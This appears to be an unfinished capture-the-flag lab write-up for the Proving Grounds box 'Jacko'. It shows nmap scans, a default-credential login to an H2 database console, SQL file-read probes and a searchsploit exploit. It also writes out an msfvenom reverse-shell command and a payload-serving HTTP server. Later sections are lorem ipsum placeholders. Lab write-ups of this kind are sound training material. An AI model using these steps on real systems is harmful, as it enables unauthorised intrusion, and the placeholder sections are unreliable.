---
Date: 2024-10-29
Platform: PG-Practice
Category: Windows
Difficulty: Intermediate
Status: In progress
IP: 192.168.182.66
Writeup: https://medium.com/@Dpsypher/proving-grounds-practice-jacko-d42c9c1e7f9e
---
# Box


# Resolution summary
- Text
- Text
## Improved skills
- skill 1
- skill 2
## Used tools
- nmap
- python

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -p- -vvv -oN jacko.nmap 192.168.182.66
---
PORT      STATE    SERVICE         REASON
80/tcp    open     http            syn-ack ttl 125
135/tcp   open     msrpc           syn-ack ttl 125
139/tcp   open     netbios-ssn     syn-ack ttl 125
445/tcp   open     microsoft-ds    syn-ack ttl 125
5040/tcp  open     unknown         syn-ack ttl 125
8082/tcp  open     blackice-alerts syn-ack ttl 125
9092/tcp  open     XmlIpcRegSvc    syn-ack ttl 125
39980/tcp filtered unknown         no-response
49664/tcp open     unknown         syn-ack ttl 125
49665/tcp open     unknown         syn-ack ttl 125
49666/tcp open     unknown         syn-ack ttl 125
49667/tcp open     unknown         syn-ack ttl 125
49668/tcp open     unknown         syn-ack ttl 125
49669/tcp open     unknown         syn-ack ttl 125
61417/tcp filtered unknown         no-response
```

Enumerated open TCP ports:
```bash
sudo nmap -p 80,135,139,445,5040,8082,9082,61417 -A 192.168.182.66 -oN jacko-ports.nmap -v
---
PORT      STATE  SERVICE       VERSION
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
5040/tcp  open   unknown
8082/tcp  open   http          H2 database http console
| http-methods: 
|_  Supported Methods: GET POST
|_http-favicon: Unknown favicon MD5: D2FBC2E4FB758DC8672CDEFB4D924540
|_http-title: H2 Console
9082/tcp  closed unknown
61417/tcp closed unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/28%OT=80%CT=9082%CU=41631%PV=Y%DS=4%DC=T%G=Y%TM=
OS:671F6F8E%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=I%CI=I%TS=U)S
OS:EQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=101%GCD=1%ISR=10C%TI=I%CI=
OS:I%TS=U)SEQ(SP=FF%GCD=1%ISR=10B%TI=I%CI=I%TS=U)OPS(O1=M578NW8NNS%O2=M578N
OS:W8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578NW8NNS%O6=M578NNS)WIN(W1=FFFF%W2=F
OS:FFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NN
OS:S%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%
OS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-28T11:03:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```
---
# Enumeration

## Port 80 - HTTP (H2 Database)
- Navigated to `http://192.168.182.66:80` and identified default page for `H2 Database Engine`
![[Pasted image 20241028212111.png]]

## Port 135 - MSRPC (Windows RPC)

## Port 139 & 445 - SMB (Apache)

## Port 8082 - HTTP (Apache)
- Navigated to `http://192.168.182.66:80`82 and identified default page for `H2 Database Engine`
![[Pasted image 20241028212149.png]]
- Attempted login with default credentials `sa:` (No Password) and accessed admin panel
![[Pasted image 20241028212232.png]]
- Ran SQL query `SELECT FILE_READ('C:\Windows\system.ini', NULL);` to test file read ability
![[Pasted image 20241028214128.png]]
- Ran `SELECT FILE_WRITE('test','C:\test.txt');` to test file write ability - access is denied to directory.
![[Pasted image 20241028214439.png]]
- Ran `searchsploit "H2"` and identified exploit `49384.txt` to compile and run Java code on target for code execution
![[Pasted image 20241028215150.png]]
- Copied Java code into SQL field and ran
![[Pasted image 20241028215317.png]]
- Loaded Java native library
![[Pasted image 20241028215433.png]]
- Evaluated script with `whoami` to confirm code execution and identify `jacko/tony`
![[Pasted image 20241028215550.png]]
- Returned to Kali host and ran `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.162 LPORT=4444 -f exe > revshell.exe` to create reverse shell executable, then `python3 -m http.server 80` to serve folder with `revshell.exe` via HTTP
![[Pasted image 20241028215953.png]]
- 
## Port 49152-60 - MSRPC (Windows RPC)
No Enumeration conducted

---
# Exploitation
## Name of the technique
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---
# Lateral Movement to user
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Lateral Movement vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---
# Privilege Escalation
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Privilege Escalation vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---
# Trophy & Loot
`local.txt` = ``
`proof.txt` = ``